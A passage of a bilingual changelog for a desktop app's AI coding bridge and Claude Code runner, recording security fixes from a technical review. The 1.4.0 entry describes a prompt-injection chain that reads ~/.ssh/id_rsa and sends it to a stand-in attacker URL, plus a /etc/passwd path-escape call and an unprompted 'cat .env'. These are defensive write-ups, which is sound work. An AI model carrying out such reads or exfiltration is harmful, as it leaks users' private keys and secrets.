name was missing. `node --check` only parses. `prova:runner` cuts two functions out of the
source with a regex and never reaches the hook.

- Both sets move to `politica.mjs` as `LEITURA` and `EDICAO` and are exported; the runner
  and the test import the same ones. Two copies of one fact were what hid the defect.
- `politica.test.mjs` asserts the content of both sets, including that `WebFetch` and
  `WebSearch` stay out of the read set (ADR-032).
- Content is not loading, so the trigger is separate: `npm run prova:runner-version` runs
  `claude-runner --version`, which links `politica.mjs` statically and answers before the
  SDK's dynamic import. A missing named import fails there. It is a CI step now.
  Proved by reversion: dropping the `export` keyword turns both the script and the test
  red, and restoring it turns them green.

The version carriers had drifted to 1.4.8 since 1.4.9 (four doc-only commits bumped
`version.md` without `npm run version:sync`), which is why CI was failing at "Portadores de
versão alinhados" on master. The bump in this commit realigns all six.

## 1.4.12 - Move the unimplemented account-profile proposal out of docs

Move the proposal and its SVG mockup to the owner's shared `.continue/code/`
workspace directory. Keep `docs/` for implemented functionality. The destination
is outside this repository, so the working proposal is no longer versioned here.

## 1.4.11 - Plan selectable Claude Code account profiles

Add an implementation proposal and a composer-layout mockup for company and
personal Claude Code profiles. The plan maps the existing local aliases to
child-process configuration, covers account-scoped discovery and session
isolation, and defines cross-repository delivery and acceptance tests.
Documentation only; account switching is not implemented in this release.

## 1.4.8 - COMMIT-RULE replaces the COMMITTER delegation: the agent commits again

The `PS — Commits: a skill COMMITTER cuida disso` block in this repository's
agent instructions said that committing and pushing were not the agent's job,
because a cron cycle would package the commit from the changelog entry. That
skill was switched off across the fleet on 03/09/2026 — `.committer.yml` here is
`enabled: false` and nothing reads it any more. Switching off the automation did
not unwrite the delegation, so the instruction stayed behind pointing at a cycle
that no longer runs: an agent reading it stops at a dirty working tree that
nothing is watching.

Replaced by the `COMMIT-RULE` echo block, whose single source is
[samirhvbr/repodocs `docs/versioning.md`](https://github.com/samirhvbr/repodocs/blob/master/docs/versioning.md#who-commits-and-when)
(ADR-016 there). It says the opposite and says it in one place for the whole
fleet: the agent commits, nothing is reported as finished until it is committed,
one subject per commit, and a large delivery is split into blocks grouped by
subject. Being a delimited block rather than per-repo prose is the point — the
COMMITTER rollout put bespoke wording into 42 files and left no mechanical way
to find and replace it when the decision behind it was reversed.


## 1.4.7 - the two Modo Code documents enter the index, and an orphan doc starts failing the build

Finding **D-DOC-10** of the September 2026 review.

- 🟢 **`docs/code/F0-mapa.md` and `docs/code/MODO-CODE-20260709.md` are in `docs/README.md`.**
  Neither was linked from anywhere — the whole `docs/code/` subdirectory was invisible to
  anyone navigating the index. `F0-mapa.md` still carries *"aguardando ratificação do Samir"*
  in its header; it was ratified by the facts (the bridge has existed since 1.1.x and has
  since been through findings F-12, F-13 and F-15), so the index entry says it is a record of
  what was known before the code was written, rather than a decision still pending.

- 🟢 **New ruler `todo_doc_e_alcancavel`:** every `.md` under `docs/` must be the target of a
  markdown link from some index or from another document. It does not judge whether a
  document is current — only whether you can *reach* it. A new `.md` turns `cargo test` red
  until someone decides where it belongs in the index, which is exactly the decision nobody
  makes when a file simply appears.

**Measured.** 78/78 green, clippy clean. Reversion: removing the two index rows → red,
naming `docs/code/F0-mapa.md`.

## 1.4.6 - CI actions get pinned by SHA, the `anna` floor rises with a reason, and the AGENTS×CLAUDE mirror gets a guard

Findings **F-09**, **F-21** and **F-30** of the September 2026 review.

- 🟢 **Every `uses:` in `ci.yml` is pinned to a commit SHA**, with a comment naming the
  version (F-09). A tag is a moving pointer and an action runs with this workflow's
  permissions. New ruler `toda_action_do_ci_esta_pinada_por_sha` sweeps the whole workflow
  directory, so a future workflow is measured just by existing.

- 🟡 **`ANNA_MINIMO` rises from 0.11.4 to 0.11.9** (F-30) — and the file's own rule was
  honoured: *"ao subir este piso, escreva o PORQUÊ"*. Two defects that hurt **here**, in the
  shell, specifically:

  1. Without the `bash` time cap that kills the process **group** (SHVIA-CODE's F-04), a tool
     that hangs holds the sidecar forever. In the desktop the `anna` is a child of the app:
     the user has no Ctrl-C to give, only killing the whole app. In a terminal that is an
     annoyance; embedded, it is a hang with no exit.
  2. Up to 0.11.8 the `bash` gate matched only the command **prefix**, so `cat .env` ran in
     **auto** (F-02) — and it is the shell that points `anna` at the user's real project
     folder, with the Modo Code page coming from the server and updating itself.

  The floor is 0.11.9 and **not** 0.11.11, though the CLI is at 0.11.12: 0.11.10 (HTML
  escaping in `anna stats`) and 0.11.11 (`cargo deny`) change nothing the bridge depends on.
  A floor is the lowest version that is safe to package, not the newest number.

- 🟢 **`AGENTS.md` and `CLAUDE.md` are byte-identical below the H1** (F-21), which both files
  already demanded of themselves — and both violated. Not carelessness: the block that
  differed was precisely the one saying *"this file is the mirror of the other"*, and written
  in the first person it **cannot** be identical in both. The rule was impossible to satisfy,
  which is how an instruction without a guard rots — nobody notices it is asking for the
  impossible. The pointer is now written in the third person, naming both files, and
  `agents_e_claude_sao_espelho` checks it on every `cargo test`.

**Measured.** 77/77 green, clippy `-D warnings` clean. Reversions: a loose action in a new
workflow → red; one extra line in `AGENTS.md` → red.

## 1.4.5 - the microphone only for the server and only the microphone; Linux voice starts requiring the session token

Finding **F-16** of the September 2026 review. Companion to SHVIA-WEB (the entry titled
"A voz do desktop passa a exigir o token da sessão"); the two must land together, or this
one after it.

- 🟠 **`shviaTts` now checks the capability token.** The native message handler exists for
  **every frame** of the webview, so a cross-origin `<iframe>` embedded in a ShvIA page
  reached it directly: it could speak arbitrary text through the host's `spd-say` and
  cancel speech with `spd-say -C`, which acts on the whole speech-dispatcher daemon and so
  left the app's boundary. `pedido_de_voz()` now drops any payload without the session
  token — silently, because a reply would turn the handler into an oracle for guessing it.
  `TTS_BRIDGE_JS` gives the page the only remaining door, `window.__shviaTts`, injected
  (like `BRIDGE_JS`) solely into pages served by a `SERVER_HOSTS` host.

  This is the gate `code_bridge::handle_message` has applied to `shviaCode` since F-12. It
  never covered voice — not because anyone judged voice harmless, but because the second
  bridge was registered later on the same `user_content_manager` and **a second bridge does
  not inherit the first one's gate**.

- 🟠 **Media permission stops being granted to whatever is loaded.** `permite_midia()`
  replaces the unconditional `req.allow()` on every `UserMediaPermissionRequest` with two
  narrowings: the main frame must be a ShvIA server host over https (the local shell has no
  capture UI and never needs a device), and only **audio** is granted — SHVIA-WEB's three
  `getUserMedia` call sites all ask for `{audio}`, so the camera was a standing grant with
  no product behind it. Anything else is now `req.deny()`.

  **Measured limitation, 02/09/2026.** WebKitGTK carries no origin and no frame on the
  request: `webkit2gtk 2.0.2` exposes exactly two getters on `UserMediaPermissionRequest`,
  `is-for-audio-device` and `is-for-video-device`. So an iframe inside a ShvIA page still
  asks with the main frame's URI and still gets the microphone; nothing in this API can
  tell the two apart. To re-check after a crate bump, look for an origin or frame getter in
  `~/.cargo/registry/src/*/webkit2gtk-*/src/auto/user_media_permission_request.rs`. While
  there is none, this is as narrow as the API allows — and it is written down rather than
  left to be noticed again.

**New ruler — `todo_handler_nativo_tem_porta_de_token`.** It does not assert "`shviaTts`
checks the token"; it counts **registered native handlers against token gates**. Registering
a third `messageHandler` without a gate turns `cargo test` red before it becomes surface —
the same shape of defect as `containerDo` (E-5) and the two window builders (F-15): the copy
is not born wrong, it is born without the rule.

Its first run failed by counting `fn pedido_de_voz(` as a gate — a ruler matching its own
definition. It counts calls now.

**Measured.** 75/75 green. Three reversions, three reds: dropping the token check (1 red),
granting video again (2 red), registering a third handler without a gate (1 red).
`cargo clippy --all-targets -- -D warnings` clean.

**Not proven here.** The WebKitGTK runtime behaviour — that the shim reaches the page, that
`req.deny()` on video is invisible to the user, that voice still works on the Linux desktop
— has no automated coverage: it needs the packaged app on a Linux desktop. Smoke test: open
a chat, press "listen" on an answer (must speak in pt-BR and the button must return from
"Parar" to "Ouvir"), then press the microphone in the composer (must still record).

## 1.4.4 - the runner gets its lock back, the dev audit goes to zero, and the state doc gets a ruler instead of a fourth cleanup

Findings **F-18**, **F-19** and **F-22** of the September 2026 review.

### F-18 · deleting the lock did not deliver freshness, it moved the staleness

Since 21/08 `claude-runner/install.sh` did `rm -f package-lock.json` before installing, for a
good reason: the Modo Code catalogue comes from the Agent SDK, so **the SDK version is the
catalogue**, and a stale lock kept the selector offering "Opus" = Opus 4.8 weeks after Opus 5
shipped.

🔴 **Measured on 02/09, it was not working.** This machine ran SDK **0.3.239** while a fresh
resolve of the very same `^0.3.239` gives **0.3.258** — nineteen releases apart. Without a
lock, the installed version is whatever was latest *the last time somebody happened to
reinstall*. That is the same staleness the deletion was meant to prevent, now unreviewable as
well, in a component that executes tools on the developer's machine.

The tradeoff was real; the sides were mislabelled. What ages is not "having a lock" — it is a
lock **nobody updates**, and a floating range is a lock nobody can see.

So: the lock is versioned, `install.sh` uses `npm ci`, and refreshing is one command —
`npm run runner:sdk-bump`, which updates the SDK and **prints the resulting catalogue**.

That last part is the point, not decoration. Exercised across two versions it shows the model
list actually changing: `claude-fable-5[1m]` at 0.3.250 became `claude-fable-5-1[1m]` at
0.3.258. The risk that motivated the 21/08 decision is now *observable* instead of invisible.

### F-19 · dev advisories

`nanoid` and `postcss`, both high, both build-only (`npm ls --omit=dev` finds neither).
`npm audit fix` — **zero vulnerabilities**, and `npm run build` still produces the bundle.

### F-22 · the third manual sanitation, replaced by a check

`.continue/estado-atual.md` described **1.1.34** with the repository at 1.4.3, and
`docs/funcionalidades.md` stopped at **0.18.1** — an entire major line missing.

The detail that decides the fix is inside the file: it already carried a note saying *"Saneado
em 07/08/2026 — este arquivo estava descrevendo a 0.8.0"*. The sanitation had been done before,
by hand, for exactly this reason, and the drift came straight back. A third one would buy a few
weeks.

`scripts/prova-frescor-da-doc.mjs` compares what each document claims against `version.md` and
fails when the gap passes tolerance. It is in CI. Both documents were brought current in the
same commit — a guard added while the thing it guards is broken is a guard that starts life
disabled.

🐛 **Two mistakes of mine, both caught by running it.** The checker first read both files the
same way and reported `funcionalidades.md` as "1002 minors behind" — its first `0.2.0` is the
oldest *entry* in a per-version log, not a claim about the document; the right signal there is
the highest version mentioned. And the distance arithmetic printed "986" across a major
boundary. Numbers nobody believes produce checks nobody reads.

## 1.4.3 - Rust advisories start being measured, and the first run found the pin the report itself predicted

Findings **DEP-3** and **F-31** of the September 2026 review.

None of the three Rust repositories measured RustSec advisories, while the third-party
sibling `ai-memory` in the same folder already had a `deny.toml`.

### 🔴 F-31 predicted the exact hole, and it was there

The finding said the `time = "=0.3.41"` pin — documented debt because of `wry`'s `cookie` —
"is the typical case where an advisory would go unnoticed". It had one:
**RUSTSEC-2026-0009**, a stack-exhaustion DoS.

And the pin turned out to be **movable with no code change at all**: `time = "=0.3.47"`
compiles, the lock resolves, and the suite stays at **72/72**. The comment said "remove when
wry/cookie move to a version that accepts the new `time`" — measurement says that already
happened and nobody re-checked. The same bump was applied to SHVIA-MOBILE.

### What `deny.toml` carries, and why each line is there

`cargo deny check advisories` was clean on nothing: **19 advisories** in this tree.

- **16 `unmaintained`**, all from Tauri's own dependency graph — the GTK3 bindings via
  `tray-icon`/`libappindicator`, `proc-macro-error`, and the `unic-*` tables. Every one of
  them says "No safe upgrade is available!". They leave when Tauri moves to gtk4, which is
  not a decision this repository can take.
- 🔴 **2 real vulnerabilities in `quick-xml` 0.38.4** that cannot be closed here. It **does
  ship in the binary** — `tauri → plist → quick-xml`, a normal dependency, checked with
  `cargo tree -i quick-xml -e normal`, not assumed. The fix is `>= 0.41` and `plist 1.8.0`
  requires `^0.38`, so `cargo update -p quick-xml` locks zero packages. What bounds it:
  `plist` parses the app's own bundle metadata, and no code here feeds it XML from a user, a
  document or the network.
- **1 in `time`**, fixed rather than ignored.

Every `ignore` entry has a written `reason` — the same doctrine as
`scripts/prova-auditoria.mjs` in SHVIA-WORKSPACE. An exception is debt with a reason and a way
to re-check it; "we'll look later" is not a reason, and a stale reason is worse than none
because it reads as a decision.

Wired into `.github/workflows/ci.yml`. Measured on both sides: dropping one `ignore` entry
turns the check red, and putting the `time` pin back to 0.3.41 brings RUSTSEC-2026-0009 back.

## 1.4.2 - a `target=_blank` window stops being a second window with rules of its own

Finding **F-15** of the 01/09/2026 technical review.

Windows opened by `target=_blank` were born from a `WebviewWindowBuilder` of their own, with
`title` and `window_features` and **nothing else**: no `on_navigation`, no `on_page_load`, no
icon, no `min_inner_size`, no close handler.

🔴 **The consequence that matters is the first one.** Without `on_navigation`, an external link
clicked inside that window **navigates inside the app** instead of going to the OS browser. A
third-party site takes over a window titled "ShvIA", wearing the application's frame — which is
the classic phishing shape. There was no native exposure (the bridges were not installed
either), so the perimeter broken was UX, not the filesystem.

**The fix is the same as everywhere in this review: one definition.** `build_shvia_window` now
takes the URL, and `on_new_window` calls it instead of building on the side. Two windows with
different rules is the defect shape of `containerDo` (E-5) and of the two update paths (G-21) —
the second copy is not born wrong, it **ages on its own**.

⚠️ **`window_features` was deliberately left out.** It comes from the PAGE
(`window.open(..., "width=300")`), and a 300px window with no bar is the other classic phishing
shape; the size of the app's window is the app's decision. Checked before deciding: the web app
**does not use `window.open`** anywhere, and the two Blade `target="_blank"` links carry no
features — so discarding them changes nothing today.

**The rulers** (`so_ha_uma_construcao_de_janela`, `o_target_blank_passa_pela_funcao_canonica`)
chase the cause and not the symptom: they fail if a second `WebviewWindowBuilder::new` shows up
outside the canonical function. Measured: with the side construction put back, both go red with
the right message.

🐛 **The first version of the ruler counted itself.** It measured its own literals — the
`matches(...)` and the error message — and reported 3 where there was 1. Same stumble as
`prova-paridade-de-imagens` in WORKSPACE, which flagged `node:fs`. The test module is cut off
before counting.

**Suite 72/72** (was 70), clippy clean with `-D warnings` on every target.

## 1.4.1 - the proofs start running on every push, and clippy gets its closed door back

Findings **G-24** and **F-20** of the 01/09/2026 technical review.

### G-24 · there was no proof CI, only packaging CI

The `build-*.yml` files existed, packaging into a release. The **proofs** ran only when someone
remembered. `.github/workflows/ci.yml` now runs on every push and PR:

- `cargo test --locked` — includes `tests_cerca` (F-12), the authorised-folder fence of the
  `code_bridge` bridge, which previously let `gitStatus`/`readFile`/`spawn` reach any path;
- `npm run prova:politica` — the policy of the "Claude Code (assinatura)" engine (F-13). It
  became a testable module precisely because the previous version **passed `node --check` and
  was broken**: `path` never imported and a nonexistent `log()`. A syntax check is not a smoke
  test, and this job exists so that lesson does not depend on memory;
- `npm run prova:bump` — the version carriers aligned (SHVIA-CODE already left `master` not
  compiling over a half-done bump);
- `cargo clippy --all-targets -- -D warnings`.

The job installs Tauri's system dependencies on Linux first: without them the `src-tauri`
`cargo test` does not even compile, and the failure would be environmental, not code.

### F-20 · two clippy warnings sitting there — and there were six

The finding recorded "2 doc warnings". Running `--all-targets`, which also reads the test code,
there are **six**: the two list-indentation ones in a doc comment (`code_bridge.rs`) plus four
`std::iter::repeat(x).take(n)` where `x.repeat(n)` fits.

This was found **by running the command** while writing the CI, not by reading the finding — the
job would have been born red. A warning with no closed door piles up until nobody reads the
output any more, and a CI that fails on day one is ignored on day two.

**Measured:** `cargo test --locked` **70/70**; `cargo clippy --locked --all-targets -D warnings`
clean; `prova:politica` and `prova:bump` green.

⚠️ **The workflow itself could not be executed here** — it only runs on GitHub. What was
verified locally is each command it invokes, and that the YAML parses with the right triggers.
The first real run is on the first push.

## 1.4.0 - the Modo Code fence starts coming from the user's gesture, and the runner stops being the back door

Findings **F-12** and **F-13** of the 01/09/2026 technical review — the last two links in the
chain that ran from an XSS in SHVIA-WEB to the disk of whoever uses the desktop. Decisions in
[ADR-031](docs/decisoes.md) and [ADR-032](docs/decisoes.md).

🔴 **F-12 — whoever asked chose the fence.** `listTree`, `readFile`, `gitStatus`, `gitDiff` and
`spawn` confined the target inside a `path` that **the page itself** sent in the message.
`read_file` required the file to be inside the `path`, and the `path` came from whoever was
asking: so `readFile('/', '/etc/passwd')` passed, and so did `listTree('/')`. The capability
token closes off the **iframe**, not the page — an XSS in the web app (whose CSP is born
disabled) runs in the origin that holds the token. `spawn` itself already recognised that actor
in order to validate the `url`; the same message, in the same handler, read the whole disk.

- **The authorised-folder list only grows through the native dialog** (`pick_folder`). Choosing
  the folder is the gesture; no message from the page authorises anything.
- **`setBinding` stops accepting a free path** — without that the page would reopen the fence
  from outside, writing the binding and then asking for the read.
- **`spawn` is fenced too:** `projectDir` is where the agent will read and write for hours.
- Comparison by **canonical** path and by **component**, so `..`, symlinks and a
  similarly-named neighbour (`/x/projeto2` against `/x/projeto`) do not get in. 5 tests.
- ⚠️ **Migration:** the list is seeded **once** with the bindings the page had already written —
  without that, everyone would lose their project folder and have to pick it again. The residue
  is written into the ADR: an installation already compromised before this version keeps what it
  wrote.

🔴 **F-13 — the other engine had the door open.** In `claude-runner`,
`Read`/`Glob`/`Grep`/`LS` of **any path** and `WebFetch`/`WebSearch` to **any URL** were
automatic, and `--aprovacao auto` released `Bash` entirely. A prompt injection in a project file
composed `Read ~/.ssh/id_rsa` → `WebFetch https://attacker/?d=…` without a card. The file's own
comment said that "one engine cannot be the other's back door".

- **The network always asks**, at any level — `WebFetch`/`WebSearch` leave the read list.
- **Reading is automatic only inside the folder and outside the secrets denylist** — the same
  one as `anna`. Confining was not enough: the project's `.env` is inside the fence and is the
  first target.
- **Destructive asks for a card even at the `auto` level** (the rule `anna` calls "`y` does not
  count").
- **The policy became a module** (`claude-runner/politica.mjs`) with 8 tests in `node --test`
  (`npm run prova:politica`). The runner executes on import, so nothing inside it was testable:
  this shell's security boundary had no proof at all (finding F-29). Nothing here **blocks** —
  what leaves the automatic path becomes a card, and the developer decides.

🐛 **And the suite was red, hiding exactly these changes.** `user_env::computar` had an
invariant written in its comment — *"União: base + extras"* — that the code did not honour: when
the login shell answered, the answer **replaced** the process PATH instead of adding to it.
Whoever opens the app from the terminal, with nvm or a venv in the session, lost those
directories in the sidecar — and the agent kept insisting on a command that exists in the
terminal next door. The test `computar_nunca_perde_o_que_ja_havia` asserted exactly that and had
been failing since before (finding F-14): it was the code that disagreed with its own comment.
Suite now **70/70**.

## 1.3.6 - Agent doc: Releases rule and the English-only language rule

Marked echo of the single source at samirhvbr/repodocs. Two rules land here:

1. The `version.md` of the default branch ON GITHUB is what the GitHub Releases
   show, and a commit that bumps it is not finished until that version has a
   tag, a Release and the `Latest` badge — same push, not "later".
2. Everything in this repository is English (US): documents, commit messages,
   pull requests, issues, code comments. The only carve-out is end-user-facing
   product strings. History is not rewritten.

Delimited by a marker, so re-running replaces instead of duplicating.

## 1.3.5 - Regra de Releases no doc de agente: bump e Release sao um ato so

Eco marcado da norma unica em samirhvbr/repodocs (docs/versioning.md). O
`version.md` da branch padrao NO GITHUB e o que as Releases no GitHub mostram, e
um commit que bumpa o `version.md` nao esta terminado ate aquela versao ter tag,
Release e o badge `Latest`.

Bloco delimitado por marcador: rodar de novo substitui, nao duplica.

## 1.3.4 - Releases automaticas: o version.md da master vira tag e Release

O GitHub nao deduz versao de mensagem de commit: sem tag, o numero e string no
`git log` e `git diff` entre versoes nao existe. Entram o
`.github/workflows/release.yml` e o `tools/release.sh`.

**A regra:** o `version.md` da branch padrao **no GitHub** e o que as Releases
**no GitHub** refletem. Checkout local nao entra na conta. Um PR nao publica
nada; no merge, o push do `version.md` dispara o workflow e a Release vira
aquela versao.

Tag e titulo = a versao pura, sem prefixo `v`. Norma:
[samirhvbr/repodocs](https://github.com/samirhvbr/repodocs/blob/master/docs/versioning.md).

## 1.3.3 - Publish do desktop passa a sair pelo usuário b3sys (o root não faz mais SSH nos servidores)

- `PUBLISH_DEST` default muda de `root@100.64.100.242` para `b3sys@100.64.100.242`. Por
  segurança o root deixou de ter SSH nos servidores; publicar como root não era mais
  possível. Comentários de uso acompanharam (`--dest usuario@HOST:/caminho/`,
  `ssh-copy-id b3sys@HOST`).
- **Diferença em relação ao servidor do SShvTerm:** lá o app é `b3sys:www-data` e o b3sys é
  o dono; aqui `/srv/shvia` é `www-data:www-data` e o **b3sys entra pelo grupo**
  (`www-data:x:33:b3sys`). Por isso o ajuste no `.242` foi `chown -R www-data:www-data` +
  `chmod -R g+w` em `storage`, e **não** um chown para b3sys — que tiraria o app do dono
  que o servidor web usa.
- `chmod g+s` em `storage/app/public/desktop`: sem ele, arquivo criado pelo b3sys nasce no
  grupo `b3sys`, e a colisão de dono volta assim que outro membro do www-data publicar.
- Motivo do cuidado: o publish daqui faz `scp` **direto para o diretório público**, com
  `release.json`, `ShvIA.app.tar.gz`, `shvia.db` e `shvia.files` em **nome fixo**. Arquivo
  já existente com outro dono não abre para escrita (o `scp` faz `O_TRUNC`, não apaga e
  recria) — foi exatamente o que travou a publicação da 1.2.77 do SShvTerm hoje, em três
  variações seguidas.
- Sem risco de "release fantasma" aqui: o script roda com `set -euo pipefail` e verifica a
  publicação pela URL pública comparando sha256 depois do `scp`. O defeito equivalente do
  outro produto (disco de distribuição com `throw => false`, escrita falhando em silêncio)
  está registrado no repo do site do SShvTerm.

## 1.3.2 - Nota do desligamento do COMMITTER passa a citar o T5

- Correção de revisão do dono: a nota do `.committer.yml` aponta o defeito medido (scan de
  segredo des-stageando por assunto, 5/6 falso-positivo na 2.92.0) e deixa claro que desligar
  tira o gatilho, não conserta o ADR-005.
- Bump Z: os 6 portadores ressincronizados via `npm run version:sync` (mantê-los em dia evita
  reabrir a divergência que a 1.3.0 corrigiu).

## 1.3.1 - Desliga o COMMITTER (kill-switch, a pedido do dono)

- `enabled: false` no `.committer.yml` — o kill-switch da SPEC §1.2, sem apagar o marcador.
- Desligado em toda a casa `x/SHVIA/*` em 29/08/2026: passou a haver agente mandando PR, e
  commit automático concorrendo com PR embaralha a história. Commit e push voltam a ser do
  agente da sessão.
- Bump Z: os 6 portadores de versão foram ressincronizados via `npm run version:sync` (a
  1.3.0 já havia corrigido a divergência deles; manter em dia evita reabri-la).

## 1.3.0 - A ponte ganha `readFile`: a árvore da aba "Arquivos" passa a poder abrir a prévia de um arquivo

- **Nova capacidade de runtime** (bump Y): `window.__shviaCode.readFile(path, file)`, no molde do
  `gitDiff` ao lado. → `{ok, content, truncated, binary, bytes}`. 5 testes contra o FILESYSTEM de
  verdade num diretório temporário — como o do `gitDiff`, um mock provaria que sabemos montar
  argumentos, não que o SO devolve o que esperamos.
- **Por que existe:** no SHVIA-WEB a aba "Arquivos" do painel do Modo Code lista a árvore, mas não
  tinha como mostrar o conteúdo de um arquivo ao clique. Era o próximo passo cross-repo para
  tornar as abas produtivas (pedido do Samir, 26/08). A aba "Alterações" já abre o diff ao clique
  (1.2.0); esta é a irmã para os arquivos que ainda não mudaram.
- ⚠️ **Não foi pedir ao `anna`**, que sabe ler arquivo — seria uma inferência PAGA para preencher
  um painel que se atualiza sozinho ao voltar o foco. Prévia é leitura de estado; o precedente é
  o `git_diff`, não o agente.
- 🔴 **A cerca é EXPLÍCITA:** canonicaliza a pasta e o alvo e exige que o alvo esteja DENTRO da
  pasta do projeto. O nome vem do `list_tree` do mesmo host (confiável), mas ler arquivo é mais
  perigoso que listar — um `..` ou symlink que escapasse é recusado antes da leitura. Reversão
  provada: sem o `starts_with`, o teste que lê um arquivo fora da pasta passa a vazar.
- **Binário não vira texto vazio:** NUL nos primeiros 8 KB (heurístico do git) → `binary:true`
  com content vazio e o `bytes` real, para a página dizer o tamanho sem despejar bytes de um PNG.
  **Arquivo grande é cortado e o diz** (`truncated`) — é prévia, não editor; `from_utf8_lossy`
  resolve o multibyte partido na fronteira sem pânico.
- Consumo no web: SHVIA-WEB (a árvore da aba Arquivos abre a gaveta de prévia). Enquanto o app
  instalado não tiver esta versão, a página degrada como "casca velha" — a linha não fica
  clicável e a aba avisa para atualizar o app, no mesmo padrão do `gitDiff`.

## 1.2.0 - A ponte ganha `gitDiff`: a aba "Alterações" do painel passa a ter o que abrir

- **Nova capacidade de runtime** (bump Y): `window.__shviaCode.gitDiff(path, file)`, no molde
  do `gitStatus` ao lado. 6 testes contra um repositório git **de verdade** num diretório
  temporário — um mock do `Command` provaria que sabemos montar argumentos, não que o git
  entende os que montamos.
- **Por que existe:** o SHVIA-WEB `2.110.39` transformou o painel do Modo Code em abas, e a
  aba **Alterações** lista os arquivos alterados mas não tinha como mostrar o diff de um.
  Era o único item cross-repo da frente. Ver `docs/FRONTEND/PAINEL-CODE-EM-ABAS.md` lá.
- ⚠️ **Não foi pedir ao `anna`**, que tem a ferramenta `git_diff`. Seria uma **inferência paga
  para preencher um painel** — e o painel se atualiza sozinho ao voltar o foco da janela,
  então cada alt-tab viraria uma chamada de modelo.
- **`vazio ≠ sem mudança`:** `git diff` compara a árvore contra o ÍNDICE, então um arquivo já
  preparado (`git add`) devolve vazio. A função cai no `--staged` e devolve `staged: true` —
  sem isso o painel diria "sem alterações" para quem acabou de ver o arquivo listado como
  alterado.
- **Teto de 256 KB cortado em fronteira de CARACTERE.** O painel pinta o diff linha a linha no
  DOM, e um lockfile ou bundle chega a megabytes. `texto[..N]` em UTF-8 entra em pânico no
  meio de um multibyte, e diff em português tem acento em toda linha.
- **O `--` antes do caminho** impede que um arquivo chamado `-p` (ou homônimo de branch) seja
  lido pelo git como opção ou revisão. Há teste com um arquivo `-p` de verdade.
- 🟡 **Um teste que passava por SORTE foi consertado antes de contar como prova.** A primeira
  versão do teste de truncamento usava um único comprimento de linha, e o corte em 256 KB caía
  numa fronteira de caractere por acaso — a reversão (voltar ao slice cru) **passava**. Um
  teste que só falha com sorte não prova guarda nenhuma. Passou a variar o deslocamento byte a
  byte, e aí a reversão estoura com `end byte index 262144 is not a char boundary; it is
  inside 'ã'`.

## 1.1.36 - Corrige o retrato da 1.1.35: as duas plataformas JÁ estão publicadas na 1.1.34

- A 1.1.35 registrou como pendência aberta ("o macOS está sem caminho de
  atualização") algo que **foi resolvido no mesmo dia, poucas horas depois**: o
  manifesto está em **1.1.34 com `linux` e `macos`**, e o app instalado é o
  1.1.34. Escrevi o retrato com a medição de 19h30 e não remedi antes de commitar.
- **Documentação errada é pior que documentação nenhuma** — alguém leria a
  pendência 0 e ia publicar de novo, ou pior, ia achar que a entrega da 1.1.34
  não chegou a ninguém.
- **O que ficou** (e é o que importava): a regra de que o `release-manifest.mjs`
  recomeça o manifesto quando a VERSÃO muda e só mescla plataformas da mesma
  versão. Publicar de uma máquina só, depois de bumpar, apaga a outra plataforma.
  A ordem certa é: publica numa, publica na outra, **sem bumpar no meio**.

## 1.1.35 - Registra o buraco de atualização do macOS: manifesto publicado está na 1.1.29 e só com linux

- **Retrato, não conserto.** O manifesto em `ai.shvia.org/storage/desktop/release.json`
  está na **1.1.29 com `linux` apenas**, enquanto o repo está na 1.1.34 — quem usa macOS
  não recebe nem o aviso de versão nova.
- **A causa é desenho, e precisa estar escrita:** o `release-manifest.mjs` recomeça o
  manifesto quando a VERSÃO muda e só mescla plataformas da mesma versão. Um build
  publicado do Arch sozinho apaga os artefatos de macOS da versão anterior. Para o
  manifesto ter as duas, **as duas máquinas têm de buildar a mesma versão**, sem bumpar
  entre uma e outra.
- Entrou como **pendência 0** (a primeira da lista) em `.continue/estado-atual.md`, com a
  ordem dos dois comandos e o que a 1.1.34 carrega e ainda não chegou a ninguém no
  macOS: o PATH do shell de login para os sidecars (ADR-030), o wrapper do
  `claude-runner` com caminho absoluto do node, e o `anna` 0.11.x.

## 1.1.34 - O wrapper do claude-runner grava o caminho do node: "claude-runner não encontrado" era o node faltando

- **O sintoma culpava o binário errado.** O motor Claude Code não subia com
  "claude-runner não encontrado — rode claude-runner/install.sh", mas o runner
  estava instalado: o wrapper `~/.local/bin/claude-runner` fazia `exec node …`
  contando com o PATH, e app de GUI não herda PATH de shell (ADR-030). Dentro do
  app o wrapper morria com `node: not found`, e a página traduzia para "não
  encontrado" — mandando o usuário reinstalar o que já estava lá (caso real de
  20/08, com o runner recém-instalado e funcionando pelo terminal).
- `claude-runner/install.sh` grava o **caminho absoluto do node** no wrapper, com
  fallback para o PATH se o node mudar de lugar depois (upgrade do Homebrew,
  troca de gerenciador de versão). Provado nos dois sentidos: com o PATH mínimo
  do launchd (`/usr/bin:/bin:/usr/sbin:/sbin`) o wrapper antigo falha e o novo
  roda; e um turno real pela assinatura respondeu (`claude-opus-5[1m]`).
- O `user_env.rs` (1.1.24) já resolvia o PATH do processo do sidecar; este
  conserto cobre o wrapper, que é um processo `sh` à parte e não passava por lá.

## 1.1.33 - O runner passa a responder --version, e o package.json dele deixa de ser um número parado

- ⚠️ **A 1.1.32 expôs uma sonda que devolveria lixo.** O `engine_status()` roda o
  binário com `--version` e trata a saída como o NÚMERO. O `anna` responde; o
  `claude-runner` **ignorava a flag** — subia em modo host, recebia EOF no stdin e
  saía, devolvendo NDJSON de arranque que a ponte mostraria como se fosse a
  versão. Sonda que responde qualquer coisa é pior que sonda que não responde:
  "encontrado, mas não respondeu" o desktop sabe classificar; lixo exibido como
  fato, não.
- **`claude-runner/package.json` vira PORTADOR de versão** (`sync-version.mjs`,
  6 portadores agora). Ele dizia `0.1.0` desde que nasceu — número parado que não
  respondia à única pergunta que se faz dele: *qual app trouxe este runner?*
  Portador que não é sincronizado é pior que portador nenhum, porque **parece**
  resposta.
- **O import do SDK virou dinâmico**, depois do `--version`. Com o `import`
  estático, a resolução do pacote acontecia antes de qualquer linha nossa rodar:
  numa instalação sem `npm install` o runner morria com `ERR_MODULE_NOT_FOUND` e
  o desktop lia isso como "binário corrompido", quando o diagnóstico certo é
  "está lá, faltam as dependências". Agora `--version` responde **mesmo sem o
  SDK** — que é exatamente quando o diagnóstico é mais útil.
- **3 réguas novas** (8+19+3 = 30 no `prova:runner`), com o subprocesso rodando
  neste repo **sem `npm install`**, de propósito: é assim que se prova que o
  `--version` não depende do SDK.
- 🐛 **Uma reversão voltou VERDE e virou comentário.** A régua "reporta a versão"
  lê o `package.json` do runner e compara — então dessincronizar os dois **juntos**
  passa. Ela prova que o runner reporta o próprio portador, não que o portador
